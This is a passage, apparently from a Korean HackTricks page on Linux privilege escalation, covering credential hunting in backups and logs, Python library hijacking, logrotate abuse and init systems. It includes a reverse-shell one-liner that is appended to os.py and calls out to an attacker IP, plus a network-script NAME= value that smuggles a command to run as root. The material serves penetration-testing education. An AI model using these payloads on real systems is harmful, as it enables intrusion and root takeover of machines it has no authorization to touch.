find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### 비밀번호를 포함할 수 있는 알려진 파일

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)의 코드를 보면 **비밀번호를 포함할 가능성이 있는 여러 파일**을 검색한다.\
**또 다른 흥미로운 도구**로는 [**LaZagne**](https://github.com/AlessandroZ/LaZagne)가 있는데, 이는 Windows, Linux & Mac용 로컬 컴퓨터에 저장된 많은 비밀번호를 복구하는 데 사용되는 오픈 소스 애플리케이션이다.

### 로그

로그를 읽을 수 있다면 그 안에서 **흥미로운/기밀 정보**를 찾을 수 있다. 로그가 더 이상할수록 더 흥미로울 가능성이 높다(아마도).\
또한, 일부 **잘못** 구성된 (backdoored?) **audit logs**는 이 글에서 설명된 것처럼 audit logs 내부에 **비밀번호를 기록**할 수 있게 할 수도 있다: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
로그를 읽기 위해서는 **로그를 읽을 수 있는 그룹** [**adm**](interesting-groups-linux-pe/index.html#adm-group)이 정말 도움이 됩니다.

### 쉘 파일
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### 일반적인 Creds 검색/Regex

파일의 **이름**이나 **내용**에 "**password**"라는 단어가 포함되어 있는 파일도 확인해야 하며, 로그 내부의 IPs와 emails, 또는 hashes regexps도 검사하세요.\
이 모든 방법을 여기서 전부 설명하지는 않겠지만 관심이 있다면 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)가 수행하는 마지막 체크들을 확인해 보세요.

## 쓰기 가능한 파일

### Python library hijacking

어떤 위치에서 **python script**가 실행될지 알고 해당 폴더에 **쓰기가 가능한 경우**(**can write inside**) 또는 **modify python libraries**할 수 있다면, OS 라이브러리를 수정해 backdoor를 심을 수 있습니다 (python script가 실행되는 위치에 쓰기가 가능하다면 os.py 라이브러리를 복사해 붙여넣으세요).

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate 악용

`logrotate`의 취약점으로 인해 로그 파일 또는 해당 상위 디렉터리에 대한 **쓰기 권한**이 있는 사용자가 권한 상승을 할 수 있습니다. 이는 `logrotate`가 종종 **root**로 실행되며, 임의 파일을 실행하도록 조작될 수 있기 때문입니다. 특히 _**/etc/bash_completion.d/**_와 같은 디렉터리가 위험합니다. 권한은 _/var/log_뿐만 아니라 로그 회전이 적용되는 모든 디렉터리에서 확인해야 합니다.

> [!TIP]
> 이 취약점은 `logrotate` 버전 `3.18.0` 및 이전 버전에 영향을 미칩니다

자세한 정보는 다음 페이지에서 확인하세요: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

이 취약점은 [**logrotten**](https://github.com/whotwagner/logrotten)으로 악용할 수 있습니다.

이 취약점은 [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)**와 매우 유사하므로, 로그를 변경할 수 있는 경우 누가 해당 로그를 관리하는지 확인하고 로그를 symlinks로 대체해 권한 상승이 가능한지 확인하세요.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**취약점 참조:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

어떤 이유로든 사용자가 _/etc/sysconfig/network-scripts_에 `ifcf-<whatever>` 스크립트를 **작성**할 수 있거나 기존 스크립트를 **수정**할 수 있다면, 시스템은 **pwned** 상태입니다.

Network scripts, _ifcg-eth0_ 예를 들어 네트워크 연결에 사용됩니다. 이들은 .INI 파일과 거의 동일하게 보입니다. 그러나 Linux에서 Network Manager (dispatcher.d)에 의해 \~sourced\~ 됩니다.

제 경우에는 이러한 네트워크 스크립트의 `NAME=` 속성이 올바르게 처리되지 않았습니다. 이름에 **공백(white/blank space)**가 있으면 시스템은 공백 뒤의 부분을 실행하려고 합니다. 이는 **첫 번째 공백 뒤의 모든 것이 root로 실행된다**는 의미입니다.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network와 /bin/id_ 사이의 공백에 주의_)

### **init, init.d, systemd, and rc.d**

디렉터리 `/etc/init.d` 는 System V init (SysVinit)를 위한 **스크립트**들이 위치하는 곳으로, **전통적인 Linux 서비스 관리 시스템**입니다. 여기에는 서비스를 `start`, `stop`, `restart`, 때로는 `reload` 하기 위한 스크립트가 포함되어 있습니다. 이들은 직접 실행하거나 `/etc/rc?.d/`에 있는 심볼릭 링크를 통해 실행할 수 있습니다. Redhat 계열에서는 대안 경로로 `/etc/rc.d/init.d`가 사용됩니다.

반면 `/etc/init`은 **Upstart**와 연관되어 있으며, Ubuntu에서 도입된 비교적 새로운 **서비스 관리** 방식으로, 서비스 관리를 위해 설정 파일을 사용합니다. Upstart로의 전환에도 불구하고 호환성 레이어 때문에 SysVinit 스크립트는 Upstart 구성과 함께 여전히 사용됩니다.

**systemd**는 현대적인 초기화 및 서비스 관리자로 등장했으며, on-demand 데몬 시작, automount 관리, 시스템 상태 스냅샷 등 고급 기능을 제공합니다. 패키지용 파일은 `/usr/lib/systemd/`에, 관리자가 수정하는 파일은 `/etc/systemd/system/`에 정리되어 있어 시스템 관리 과정을 간소화합니다.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks는 일반적으로 privileged kernel 기능을 userspace manager에 노출하기 위해 syscall을 후킹합니다. FD-order 기반 서명 검사나 취약한 비밀번호 방식 같은 약한 manager 인증은 로컬 앱이 manager를 가장하여 이미 root화된 장치에서 root로 상승할 수 있게 할 수 있습니다. 자세한 내용과 exploitation 세부사항은 다음을 참조:



{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)


{{#include ../../banners/hacktricks-training.md}}
